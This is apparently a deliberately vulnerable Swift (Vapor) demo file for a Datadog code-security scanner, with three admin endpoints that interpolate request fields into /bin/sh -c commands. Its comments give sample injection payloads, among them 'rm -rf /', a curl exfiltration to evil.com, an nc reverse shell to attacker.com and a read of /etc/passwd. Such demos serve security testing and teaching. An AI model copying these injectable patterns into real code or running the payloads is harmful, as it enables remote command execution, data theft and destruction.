// SystemUtils.swift
// Shopist – System maintenance and utility commands
// ⚠️  DEMO FILE – Intentionally vulnerable for Datadog Code Security demo
// DO NOT USE IN PRODUCTION

import Foundation
import Vapor

struct SystemUtilsController: RouteCollection {

    func boot(routes: RoutesBuilder) throws {
        let admin = routes.grouped("admin", "system")
        admin.post("chmod", use: changeFilePermissions)
        admin.post("run", use: runMaintenanceCommand)
        admin.post("cleanup", use: cleanupDirectory)
    }

    // VULN 1: Command Injection via /bin/sh -c with user-controlled perms and path
    // Both `perms` and `path` come from the admin API request body; they are
    // interpolated directly into a shell -c argument, allowing an attacker to execute
    // arbitrary commands (e.g., path = "/var/shopist/uploads; rm -rf /").
    func changeFilePermissions(req: Request) throws -> Response {
        struct ChmodRequest: Content {
            var perms: String   // e.g., "755"
            var path: String    // e.g., "uploads/products"
        }
        let body = try req.content.decode(ChmodRequest.self)

        // Attacker input for path: "/var/shopist/uploads; curl http://evil.com/$(id)"
        let process = Process()
        process.launchPath = "/bin/sh"
        process.arguments = ["-c", "chmod \(body.perms) \(body.path)"]
        try process.run()
        process.waitUntilExit()

        return Response(status: .ok, body: .init(string: "Permissions updated"))
    }

    // VULN 2: Command Injection via user-controlled shell command passed to Process
    // The `command` field in the admin payload is a raw shell command string; the
    // server passes it directly to /bin/sh -c, giving the caller full shell access.
    func runMaintenanceCommand(req: Request) throws -> Response {
        struct MaintenanceRequest: Content {
            var command: String   // e.g., "clear-cache"
        }
        let body = try req.content.decode(MaintenanceRequest.self)

        // Admin dashboard passes user-supplied "command" without an allowlist check
        // Attacker input: "clear-cache && nc -e /bin/sh attacker.com 4444"
        let allowedPrefix = "/usr/local/bin/shopist-"
        let fullCommand = allowedPrefix + body.command    // prefix bypass: "../../bin/sh"

        let process = Process()
        process.launchPath = "/bin/sh"
        process.arguments = ["-c", fullCommand]
        try process.run()
        process.waitUntilExit()

        return Response(status: .ok, body: .init(string: "Command executed"))
    }

    // VULN 3: Command Injection via string concatenation in a system call
    // `directory` is a request parameter concatenated into a cleanup shell command.
    // An attacker can escape the intended rm scope and run additional commands.
    func cleanupDirectory(req: Request) throws -> Response {
        struct CleanupRequest: Content {
            var directory: String   // e.g., "tmp/session_data"
            var olderThanDays: Int
        }
        let body = try req.content.decode(CleanupRequest.self)

        // Attacker input for directory: "tmp/session_data && cat /etc/passwd > /tmp/out"
        let cleanupCommand = "find /var/shopist/" + body.directory +
                             " -mtime +" + String(body.olderThanDays) + " -delete"

        let process = Process()
        process.launchPath = "/bin/sh"
        process.arguments = ["-c", cleanupCommand]
        try process.run()
        process.waitUntilExit()

        return Response(status: .ok, body: .init(string: "Cleanup complete for \(body.directory)"))
    }
}
